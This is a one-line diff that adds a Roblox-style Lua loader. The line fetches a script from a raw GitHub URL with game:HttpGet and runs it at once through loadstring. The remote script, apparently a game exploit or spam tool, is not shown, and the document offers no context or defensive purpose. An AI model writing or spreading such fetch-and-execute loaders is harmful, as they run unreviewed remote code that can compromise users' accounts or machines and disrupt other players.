@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/anniversary-daybreak-spam1-mjfu5hgdjmu1j0.lua"))()
